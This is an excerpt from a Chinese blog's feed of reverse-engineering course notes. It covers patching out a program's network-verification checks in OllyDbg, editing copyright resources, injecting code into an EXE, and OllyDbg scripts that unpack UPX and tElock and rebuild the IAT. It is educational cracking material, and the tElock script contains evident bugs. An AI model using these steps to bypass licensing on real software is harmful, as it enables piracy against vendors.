kernel32.BaseThreadInitThunk</span><br><span class="line">004094F1  |. |B8 00000000   mov eax,0x0</span><br><span class="line">004094F6  |. |0f94c0        sete al</span><br><span class="line">004094F9  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004094FC  |. |8B5D F8       mov ebx,[local.2]                 ;  kernel32.76A4336A</span><br><span class="line">004094FF  |. |85DB          test ebx,ebx</span><br><span class="line">00409501  |. |74 09         je short 第七课作.0040950C</span><br><span class="line">00409503  |. |53            push ebx</span><br><span class="line">00409504  |. |E8 2D090000   call 第七课作.00409E36</span><br><span class="line">00409509  |. |83C4 04       add esp,0x4</span><br><span class="line">0040950C  |&gt; |837D F4 00    cmp [local.3],0x0</span><br><span class="line">00409510  |. |0F84 DE000000 je 第七课作.004095F4                  ;  nop掉</span><br><span class="line">00409516  |. |68 0F000000   push 0xF</span><br><span class="line">0040951B  |. |E8 1DDAFFFF   call 第七课作.00406F3D</span><br><span class="line">00409520  |. |8945 FC       mov [local.1],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00409523  |. |68 04000080   push 0x80000004</span><br><span class="line">00409528  |. |6A 00         push 0x0</span><br><span class="line">0040952A  |. |8B45 FC       mov eax,[local.1]</span><br><span class="line">0040952D  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040952F  |. |75 05         jnz short 第七课作.00409536</span><br><span class="line">00409531  |. |B8 3E264900   mov eax,第七课作.0049263E</span><br><span class="line">00409536  |&gt; |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00409537  |. |68 01000000   push 0x1</span><br><span class="line">0040953C  |. |BB F0AC4000   mov ebx,第七课作.0040ACF0</span><br><span class="line">00409541  |. |E8 08090000   call 第七课作.00409E4E</span><br><span class="line">00409546  |. |83C4 10       add esp,0x10</span><br><span class="line">00409549  |. |8945 F8       mov [local.2],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040954C  |. |8B5D FC       mov ebx,[local.1]</span><br><span class="line">0040954F  |. |85DB          test ebx,ebx</span><br><span class="line">00409551  |. |74 09         je short 第七课作.0040955C</span><br><span class="line">00409553  |. |53            push ebx</span><br><span class="line">00409554  |. |E8 DD080000   call 第七课作.00409E36</span><br><span class="line">00409559  |. |83C4 04       add esp,0x4</span><br><span class="line">0040955C  |&gt; |B8 91C65500   mov eax,第七课作.0055C691</span><br><span class="line">00409561  |. |33C9          xor ecx,ecx</span><br><span class="line">00409563  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00409565  |. |74 03         je short 第七课作.0040956A</span><br><span class="line">00409567  |. |8B48 04       mov ecx,dword ptr ds:[eax+0x4]</span><br><span class="line">0040956A  |&gt; |51            push ecx</span><br><span class="line">0040956B  |. |83C0 08       add eax,0x8</span><br><span class="line">0040956E  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040956F  |. |8B45 F8       mov eax,[local.2]                 ;  kernel32.76A4336A</span><br><span class="line">00409572  |. |33DB          xor ebx,ebx</span><br><span class="line">00409574  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00409576  |. |74 03         je short 第七课作.0040957B</span><br><span class="line">00409578  |. |8B58 04       mov ebx,dword ptr ds:[eax+0x4]</span><br><span class="line">0040957B  |&gt; |83C0 08       add eax,0x8</span><br><span class="line">0040957E  |. |50            push eax                          ;  kernel32.BaseThreadInitThunk</span><br><span class="line">0040957F  |. |3BD9          cmp ebx,ecx</span><br><span class="line">00409581  |. |B8 01000000   mov eax,0x1</span><br><span class="line">00409586  |. |75 0A         jnz short 第七课作.00409592</span><br><span class="line">00409588  |. |48            dec eax                           ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00409589  |. |85C9          test ecx,ecx</span><br><span class="line">0040958B  |. |74 05         je short 第七课作.00409592</span><br><span class="line">0040958D  |. |E8 C3CFFFFF   call 第七课作.00406555</span><br><span class="line">00409592  |&gt; |83C4 0C       add esp,0xC</span><br><span class="line">00409595  |. |85C0          test eax,eax                      ;  kernel32.BaseThreadInitThunk</span><br><span class="line">00409597  |. |B8 00000000   mov eax,0x0</span><br><span class="line">0040959C  |. |0f94c0        sete al</span><br><span class="line">0040959F  |. |8945 F4       mov [local.3],eax                 ;  kernel32.BaseThreadInitThunk</span><br><span class="line">004095A2  |. |8B5D F8       mov ebx,[local.2]                 ;  kernel32.76A4336A</span><br><span class="line">004095A5  |. |85DB          test ebx,ebx</span><br><span class="line">004095A7  |. |74 09         je short 第七课作.004095B2</span><br><span class="line">004095A9  |. |53            push ebx</span><br><span class="line">004095AA  |. |E8 87080000   call 第七课作.00409E36</span><br><span class="line">004095AF  |. |83C4 04       add esp,0x4</span><br><span class="line">004095B2  |&gt; |837D F4 00    cmp [local.3],0x0</span><br><span class="line">004095B6  |. |0F84 38000000 je 第七课作.004095F4                  ;  nop掉</span><br><span class="line">004095BC  |. |6A 00         push 0x0</span><br><span class="line">004095BE  |. |6A 00         push 0x0</span><br><span class="line">004095C0  |. |6A 00         push 0x0</span><br><span class="line">004095C2  |. |68 04000080   push 0x80000004</span><br><span class="line">004095C7  |. |6A 00         push 0x0</span><br><span class="line">004095C9  |. |68 AFD15500   push 第七课作.0055D1AF                ;  一级效验通过</span><br><span class="line">004095CE  |. |68 0F000100   push 0x1000F</span><br><span class="line">004095D3  |. |68 7D6B0116   push 0x16016B7D</span><br><span class="line">004095D8  |. |68 2B010152   push 0x5201012B</span><br><span class="line">004095DD  |. |68 03000000   push 0x3</span><br><span class="line">004095E2  |. |BB E0B94000   mov ebx,第七课作.0040B9E0</span><br><span class="line">004095E7  |. |E8 62080000   call 第七课作.00409E4E</span><br><span class="line">004095EC  |. |83C4 28       add esp,0x28</span><br><span class="line">004095EF  |. |E9 39000000   jmp 第七课作.0040962D</span><br><span class="line">004095F4  |&gt; \BB 06000000   mov ebx,0x6                       ;  nop掉，大跳转结束</span><br><span class="line">004095F9  |.  E8 3D7CFFFF   call 第七课作.0040123B</span><br><span class="line">004095FE  |.  68 01030080   push 0x80000301</span><br><span class="line">00409603  |.  6A 00         push 0x0</span><br><span class="line">00409605  |.  68 00000000   push 0x0</span><br><span class="line">0040960A  |.  68 04000080   push 0x80000004</span><br><span class="line">0040960F  |.  6A 00         push 0x0</span><br><span class="line">00409611  |.  68 BDC65500   push 第七课作.0055C6BD                ;  暗桩</span><br><span class="line">00409616  |.  68 04000000   push 0x4</span><br><span class="line">0040961B  |.  BB 20B14000   mov ebx,第七课作.0040B120</span><br><span class="line">00409620  |.  E8 29080000   call 第七课作.00409E4E</span><br><span class="line">00409625  |.  83C4 34       add esp,0x34</span><br><span class="line">00409628  |.  E9 00000000   jmp 第七课作.0040962D</span><br><span class="line">0040962D  |&gt;  8BE5          mov esp,ebp</span><br><span class="line">0040962F  |.  5D            pop ebp                           ;  kernel32.76A4336A</span><br><span class="line">00409630  \.  C3            retn</span><br></pre></td></tr></table></figure></div><p>运行起来</p><p><a href="https://i.loli.net/2018/07/14/5b49f62eb38fa.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f62eb38fa.jpg" class="lazyload"></a></p><p>完美</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;吾爱破解培训第七课：手把手教你从实例看如何攻破常见的网络验证&quot;&gt;&lt;a href=&quot;#吾爱破解培训第七课：手把手教你从实例看如何攻破常见的网络验证&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="吾爱破解培训" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="脱壳，网络验证" scheme="https://kabeor.github.io/tags/%E8%84%B1%E5%A3%B3%EF%BC%8C%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解培训第三课：改头换面之修改版权和资源</title>
    <link href="https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%89%E8%AF%BE%EF%BC%9A%E6%94%B9%E5%A4%B4%E6%8D%A2%E9%9D%A2%E4%B9%8B%E4%BF%AE%E6%94%B9%E7%89%88%E6%9D%83%E5%92%8C%E8%B5%84%E6%BA%90/"/>
    <id>https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%89%E8%AF%BE%EF%BC%9A%E6%94%B9%E5%A4%B4%E6%8D%A2%E9%9D%A2%E4%B9%8B%E4%BF%AE%E6%94%B9%E7%89%88%E6%9D%83%E5%92%8C%E8%B5%84%E6%BA%90/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:36:36.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱破解培训第三课：改头换面之修改版权和资源"><a href="#吾爱破解培训第三课：改头换面之修改版权和资源" class="headerlink" title="吾爱破解培训第三课：改头换面之修改版权和资源"></a>吾爱破解培训第三课：改头换面之修改版权和资源</h1><p>1.利用资源编辑器修改版权<br>Restorator<br>ResEdit<br>ResHacker</p><p>2.利用API定位修改版权的地方<br>SetDlgItemTextW/A (DialogBox控件设置文本)</p><p>3.利用十六进制编辑器修改<br>C32Asm<br>Winhex</p><p>操作实例见另一篇笔记<br><a href="http://note.youdao.com/noteshare?id=fac4a494abe9d4e16f1fb4d7e8737498" target="_blank" rel="noopener">对PixtopianBook的破解</a></p><h3 id="给Exe程序添加弹窗"><a href="#给Exe程序添加弹窗" class="headerlink" title="给Exe程序添加弹窗"></a>给Exe程序添加弹窗</h3><p>1.添加MessageBoxA的导入表并获取VA</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MessageBoxA</span><br><span class="line">MessageBoxA  ord:0 rva: 001AA187 VA:005AA187</span><br></pre></td></tr></table></figure></div><p>2.添加一个新的区段，并植入汇编代码(弹窗并跳回原来的EP)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push Style(0)</span><br><span class="line">push Title</span><br><span class="line">push Text</span><br><span class="line">push hOwner(0)</span><br><span class="line">call dword ptr ds:[0x5AA187]</span><br></pre></td></tr></table></figure></div><p>3.修改EP到新的起始位置并保存</p><h3 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h3><p>使用Restorator，注意&amp;加字母表示快捷键 </p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;吾爱破解培训第三课：改头换面之修改版权和资源&quot;&gt;&lt;a href=&quot;#吾爱破解培训第三课：改头换面之修改版权和资源&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="吾爱破解培训" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="脱壳" scheme="https://kabeor.github.io/tags/%E8%84%B1%E5%A3%B3/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解培训第九课：短兵相接--深入浅出探讨脱壳细节（下）</title>
    <link href="https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B9%9D%E8%AF%BE%EF%BC%9A%E7%9F%AD%E5%85%B5%E7%9B%B8%E6%8E%A5--%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E6%8E%A2%E8%AE%A8%E8%84%B1%E5%A3%B3%E7%BB%86%E8%8A%82%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B9%9D%E8%AF%BE%EF%BC%9A%E7%9F%AD%E5%85%B5%E7%9B%B8%E6%8E%A5--%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E6%8E%A2%E8%AE%A8%E8%84%B1%E5%A3%B3%E7%BB%86%E8%8A%82%EF%BC%88%E4%B8%8B%EF%BC%89/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:36:22.222Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱破解培训第九课：短兵相接–深入浅出探讨脱壳细节（下）"><a href="#吾爱破解培训第九课：短兵相接–深入浅出探讨脱壳细节（下）" class="headerlink" title="吾爱破解培训第九课：短兵相接–深入浅出探讨脱壳细节（下）"></a>吾爱破解培训第九课：短兵相接–深入浅出探讨脱壳细节（下）</h1><p>程序的导入表，是静态可见的,包含了导入的dll名字，和他的导入函数</p><p>壳会在加壳的时候，把导入表这个结构给拿出来<br>然后自己加密，或者改变结构</p><p>壳改了以后，系统就找不到导入表了，也就无法给我们的程序填充所需要的函数地址。</p><p>加过壳的程序一定可以运行的。</p><p>所以填充过程被取代了，这个过程被在壳段完成。</p><p>脱壳的时候直接dump,软件导入表是不在的，iat所填充的函数地址是当前系统的地址，所以这个程序可能只能在脱壳的机器运行，换台机器就失败了。</p><p>解决这个问题，导入表，<br>IMREC</p><p>IAT的地址值=》生成一份导入表，然后让程序使用新的导入表，那么程序就可以跨系统，在各个机器上用。</p><blockquote><p>编写OD脚本</p></blockquote><p>OD插件：  Script Functions </p><p>脚本的指令<br>sti             相当于f7<br>sto             相当于f8<br>bp 地址         下断点<br>run             相当于f9<br>MSG “文字”      弹出对话框<br>ret             结束<br>bphws esp,”r”   硬件断点</p><blockquote><p>运用栈平衡找oep的手段</p></blockquote><p>首先要执行一条压栈指令，来改变栈，然后等以后再次读入这个栈内容的时候，就说明有栈平衡的迹象，那么就很有可能是一个栈恢复<br>一般来说压缩壳只有有一次恢复，然后就到oep了，所以利用这个特性我们来找oep</p><blockquote><p>IAT修复</p></blockquote><p>CTRl+G搜索<br>FF15</p><p>FF25</p><p>数据窗口找IAT起始和终点，值有明显00000000分界</p><blockquote><p>UPX脚本</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov iat_b,00432000</span><br><span class="line">mov iat_e,00432554              ;iat_b&#x3D;00432000</span><br><span class="line"></span><br><span class="line">sti;pushad</span><br><span class="line">bphws esp,&quot;r&quot;                   ;hr esp</span><br><span class="line">run</span><br><span class="line">sti</span><br><span class="line">sti</span><br><span class="line">sti                            ;到了jnz</span><br><span class="line">bp eip                        ;</span><br><span class="line">@LOOP:</span><br><span class="line">run</span><br><span class="line">cmp esp,eax</span><br><span class="line">jnz @LOOP</span><br><span class="line">sti</span><br><span class="line">sti</span><br><span class="line">sti</span><br><span class="line"></span><br><span class="line">MSG &quot;到OEP了&quot;</span><br><span class="line"></span><br><span class="line">@IAT_LOOP:</span><br><span class="line">mov iat,[iat_b]</span><br><span class="line">cmp iat,0</span><br><span class="line">je  @NEXT_LOOP</span><br><span class="line"></span><br><span class="line">mov api,[iat+1]</span><br><span class="line">mov [iat_b],api                ;重建iat</span><br><span class="line"></span><br><span class="line">@NEXT_LOOP:</span><br><span class="line">add iat_b,4</span><br><span class="line">cmp iat_b,iat_e</span><br><span class="line">jne @IAT_LOOP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MSG &quot;OK IAT 修复已经完成&quot;</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;mov iat,[iat_b];意思就是把00432000内存里面值拿出来，而不是拿出来00432000</span><br><span class="line">;mov iat,iat_b  ;iat_b &#x3D; 00432000</span><br><span class="line">;iat &#x3D; 00432000</span><br><span class="line">;mov iat,[iat_b] ;iat &#x3D; 00960306</span><br><span class="line"></span><br><span class="line">;0045775E    39C4            cmp esp,eax</span><br><span class="line">;00457760  ^ 75 FA           jnz short upx的大?0045775C</span><br><span class="line"></span><br><span class="line">;UPX的壳段代码是差不多的，那么这个脚本就可以用来找这个upx版本所有加壳程序的OEP,而且不用管ASLR的问题</span><br><span class="line"></span><br><span class="line">;00432554  00000000</span><br></pre></td></tr></table></figure></div><h1 id="实例破解"><a href="#实例破解" class="headerlink" title="实例破解"></a>实例破解</h1><blockquote><p>查壳<br><a href="https://i.loli.net/2018/07/14/5b49f65d99283.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f65d99283.jpg" class="lazyload"></a></p></blockquote><p>tElock壳</p><blockquote><p>脱壳</p></blockquote><p>二次内存镜象法</p><p>OD载入，按M打开内存窗口<br><a href="https://i.loli.net/2018/07/14/5b49f65dc2519.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49f65dc2519.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/14/5b49f65de9833.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49f65de9833.jpg" class="lazyload"></a></p><p>找到.rdata,F2下断点，shift+F9运行<br><a href="https://i.loli.net/2018/07/14/5b49f65e1af89.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49f65e1af89.jpg" class="lazyload"></a></p><p>再次打开内存窗口，找到.text，F2下断点，shift+F9运行，即可到达OEP<br><a href="https://i.loli.net/2018/07/14/5b49f65e4032b.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49f65e4032b.jpg" class="lazyload"></a></p><blockquote><p>tElock脱壳修复IAT脚本</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bc</span><br><span class="line">bpmc</span><br><span class="line">bphwcall</span><br><span class="line"></span><br><span class="line">GPI MAINBASE                          &#x2F;&#x2F;获取mainbase（00400000） （.text）</span><br><span class="line">mov DOS_HEADER , $RESULT</span><br><span class="line">mov E_LFANEW   , [DOS_HEADER + 3C]</span><br><span class="line">mov NT_HEADER  , DOS_HEADER  + E_LFANEW</span><br><span class="line">mov SEC_HEADER , NT_HEADER   + F8 </span><br><span class="line"></span><br><span class="line">mov SEC_ADRESS , [SEC_HEADER  + C]</span><br><span class="line">add SEC_ADRESS , DOS_HEADER</span><br><span class="line">mov Sec1_Addr  , SEC_ADRESS             &#x2F;&#x2F;取地址</span><br><span class="line">mov SEC_SIZE   , [SEC_HEADER  + 8]</span><br><span class="line">mov Sec1_Size  , SEC_SIZE               &#x2F;&#x2F;取大小</span><br><span class="line"></span><br><span class="line">add SEC_HEADER , 28</span><br><span class="line">mov SEC_ADRESS , [SEC_HEADER  + C]</span><br><span class="line">add SEC_ADRESS , DOS_HEADER</span><br><span class="line">mov Sec2_Addr  , SEC_ADRESS</span><br><span class="line">mov SEC_SIZE   , [SEC_HEADER  + 8]</span><br><span class="line">mov Sec2_Size  , SEC_SIZE</span><br><span class="line"></span><br><span class="line">bprm Sec_Addr  , Sec1_Size              &#x2F;&#x2F;内存断点</span><br><span class="line">esto                                    </span><br><span class="line">bprm Sec_Addr  , Sec2_Size</span><br><span class="line">esto</span><br><span class="line">bprm Sec1_Addr , Sec1_Size</span><br><span class="line">esto</span><br><span class="line">bpmc</span><br><span class="line">mov OEP        , eip</span><br><span class="line">msg &quot;Reached OEP!&quot;                   &#x2F;&#x2F;到OEP</span><br><span class="line"></span><br><span class="line">AskIATStart:</span><br><span class="line">                                                             &#x2F;&#x2F;0047D024 IAT表起始</span><br><span class="line">ask &quot;Please Enter Start of IAT, In This DEMO : 0047D024&quot;</span><br><span class="line">cmp $RESULT    , 0</span><br><span class="line">je AskIATStart</span><br><span class="line">mov IAT_START  , $RESULT</span><br><span class="line"></span><br><span class="line">AskIATStart:</span><br><span class="line">                                                             &#x2F;&#x2F;0047D5FC IAT表结束</span><br><span class="line">ask &quot;Please Enter End of IAT, In This DEMO : 0047D5FC&quot;</span><br><span class="line">cmp $RESULT    , 0</span><br><span class="line">je AskIATStart</span><br><span class="line">mov IAT_START  , $RESULT</span><br><span class="line"></span><br><span class="line">mov PTR_IAT    , IAT_START</span><br><span class="line">Fix_IAT:</span><br><span class="line">mov ADR_IAT    , [PTA_IAT]</span><br><span class="line">cmp ADR_IAT    , 0             &#x2F;&#x2F;判断是否为0</span><br><span class="line">je Fix_Next                    </span><br><span class="line">gn  ADR_IAT                    &#x2F;&#x2F;判断是否需要修复</span><br><span class="line">cmp $RESULT    , 0</span><br><span class="line">jne Fix_Next</span><br><span class="line">mov eip        , ADR_IAT       &#x2F;&#x2F;把eip地址换为IAT地址</span><br><span class="line">rtr</span><br><span class="line">sti</span><br><span class="line">mov [PTR_IAT]  , eip</span><br><span class="line">Fix_Next</span><br><span class="line">add PTR_IAT    , 4</span><br><span class="line">cmp PTR_IAT    , IAT_END</span><br><span class="line">ja Finish</span><br><span class="line">jmp Fix_IAT</span><br><span class="line"></span><br><span class="line">Finish:</span><br><span class="line">mov eip        , OEP</span><br><span class="line">msg &quot;All Fixed&quot;</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;吾爱破解培训第九课：短兵相接–深入浅出探讨脱壳细节（下）&quot;&gt;&lt;a href=&quot;#吾爱破解培训第九课：短兵相接–深入浅出探讨脱壳细节（下）&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="吾爱破解培训" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="脱壳" scheme="https://kabeor.github.io/tags/%E8%84%B1%E5%A3%B3/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解培训第二课：实战去广告、弹窗及主页锁定</title>
    <link href="https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%BA%8C%E8%AF%BE%EF%BC%9A%E5%AE%9E%E6%88%98%E5%8E%BB%E5%B9%BF%E5%91%8A%E3%80%81%E5%BC%B9%E7%AA%97%E5%8F%8A%E4%B8%BB%E9%A1%B5%E9%94%81%E5%AE%9A/"/>
    <id>https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%BA%8C%E8%AF%BE%EF%BC%9A%E5%AE%9E%E6%88%98%E5%8E%BB%E5%B9%BF%E5%91%8A%E3%80%81%E5%BC%B9%E7%AA%97%E5%8F%8A%E4%B8%BB%E9%A1%B5%E9%94%81%E5%AE%9A/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:36:18.251Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱破解培训第二课：实战去广告、弹窗及主页锁定"><a href="#吾爱破解培训第二课：实战去广告、弹窗及主页锁定" class="headerlink" title="吾爱破解培训第二课：实战去广告、弹窗及主页锁定"></a>吾爱破解培训第二课：实战去广告、弹窗及主页锁定</h1><h3 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h3><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。</p><p>DLL文件中存放的是各类程序的函数(子过程)实现过程，当程序需要调用函数时需要先载入DLL，然后取得函数的地址，最后进行调用。使用DLL文件的好处是程序不需要在运行之初加载所有代码，只有在程序需要某个函数的时候才从DLL中取出。另外，使用DLL文件还可以减小程序的体积。</p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>线程，有时被称为轻量级进程(Lightweight Process，LWP），是程序执行流的最小单元。一个标准的线程由线程ID，当前指令指针(PC），寄存器集合和堆栈组成。另外，线程是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自己不拥有系统资源，只拥有一点儿在运行中必不可少的资源，但它可与同属一个进程的其它线程共享进程所拥有的全部资源。一个线程可以创建和撤消另一个线程，同一进程中的多个线程之间可以并发执行。由于线程之间的相互制约，致使线程在运行中呈现出间断性。线程也有就绪、阻塞和运行三种基本状态。就绪状态是指线程具备运行的所有条件，逻辑上可以运行，在等待处理机；运行状态是指线程占有处理机正在运行；阻塞状态是指线程在等待一个事件（如某个信号量），逻辑上不可执行。每一个程序都至少有一个线程，若程序只有一个线程，那就是程序本身。</p><p>线程是程序中一个单一的顺序控制流程。进程内有一个相对独立的、可调度的执行单元，是系统独立调度和分派CPU的基本单位指令运行时的程序的调度单位。在单个程序中同时运行多个线程完成不同的工作，称为多线程。</p><h3 id="基础汇编指令"><a href="#基础汇编指令" class="headerlink" title="基础汇编指令"></a>基础汇编指令</h3><blockquote><p>ret和retf</p></blockquote><p>ret指令用栈中的数据，修改IP的内容，从而实现近转移</p><p>(IP)=((ss)*16+(sp))<br>(sp)=(sp)+2<br>等于 pop IP<br>retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移</p><p>(IP)=((ss)<em>16+(sp))<br>(sp)=(sp)+2<br>(IP)=((ss)</em>16+(sp))<br>(sp)=(sp)+2<br>等于 pop IP，pop CS</p><blockquote><p>call指令<br>CPU执行call指令时，进行两步操作：</p></blockquote><p>将当前的IP或CS和IP压入栈中<br>转移<br>call指令不能实现短转移，除此之外,call与jmp类似。</p><p><a href="https://www.cnblogs.com/findumars/p/4121980.html" target="_blank" rel="noopener">汇编语言转移指令规则汇总</a></p><h3 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h3><blockquote><p>MessageBox函数</p></blockquote><p> MessageBox 函数用于创建、显示并操作一个消息对话框。该对话框包含由调用程序定义的信息和标题，以及预先定义的图标和按钮。</p><pre><code>int MessageBoxA( HWND hWnd, LPCSTR lpText, LPCSTR lpCaption,   UINT uType);  int MessageBoxW( HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption,   UINT uType); int MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption,   UINT uType); </code></pre><p>参数</p><p>　　●hWnd：<br>此参数代表消息框拥有的窗口。如果为NULL，则消息框没有拥有窗口。</p><p>　　●lpText：<br>消息框的内容。如果使用了Unicode库，则把文本变成：</p><pre><code>TEXT(/*sometext*/)</code></pre><p>lpCaption：<br>消息框的标题。如果使用了Unicode库，则把文本变成：</p><pre><code>TEXT(/*sometext*/)</code></pre><p>　　●uType：<br>指定一个决定对话框的内容和行为的位标志集。此参数可以为下列标志组中标志的组合。指定下列标志中的一个来显示消息框中的按钮以及图标。</p><p>MessageBox是在库里声明了一个宏 当你使用宽字符的时候,也就是unicode的时候,自动帮你转换使用 MessageBoxW 而当你使用窄字符的时候,会自动帮你转换到 MEssageBoxA </p><blockquote><p>ShellExecute</p></blockquote><p>ShellExecute的功能是运行一个外部程序（或者是打开一个已注册的文件、打开一个目录、打印一个文件等等），并对外部程序有一定的控制。有几个API函数都可以实现这些功能，但是在大多数情况下ShellExecute是更多的被使用的，同时它并不是太复杂。</p><pre><code>HINSTANCE ShellExecute(HWND hwnd, LPCTSTR lpOperation, LPCTSTR lpFile, LPCTSTR lpParameters, LPCTSTR lpDirectory, INT nShowCmd); </code></pre><p>标准用法 </p><p>　　ShellExecute函数原型及参数含义如下： </p><p>　　function ShellExecute(hWnd: HWND; Operation, FileName, Parameters,Directory: PChar; ShowCmd: Integer): HINST; stdcall; </p><p>　　●hWnd：用于指定父窗口句柄。当函数调用过程出现错误时，它将作为Windows消息窗口的父窗口。例如，可以将其设置为应用程序主窗口句柄，即Application.Handle，也可以将其设置为桌面窗口句柄（用GetDesktopWindow函数获得）。 </p><p>　　